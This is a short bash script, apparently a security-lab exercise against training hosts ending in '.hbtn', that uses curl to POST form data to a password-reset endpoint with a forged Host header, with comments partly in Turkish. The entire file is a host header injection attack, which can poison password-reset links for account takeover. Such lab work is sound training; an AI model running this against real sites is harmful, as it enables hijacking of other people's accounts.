#!/usr/bin/env bash
# 1-host_header_injection.sh
# Usage: ./1-host_header_injection.sh new_host target_url form_data
# Example: ./1-host_header_injection.sh new_host http://web0x00.hbtn/reset_password "email=test@test.hbtn"

set -euo pipefail

if [ "$#" -ne 3 ]; then
  echo "Usage: $0 NEW_HOST TARGET_URL FORM_DATA"
  echo "Example: $0 new_host http://web0x00.hbtn/reset_password \"email=test@test.hbtn\""
  exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# curl ile Host header'ı değiştirip POST atıyoruz. -s sessiz, -L takip et (redirect).
curl -s -L -X POST \
  -H "Host: ${NEW_HOST}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "${FORM_DATA}" \
  "${TARGET_URL}"
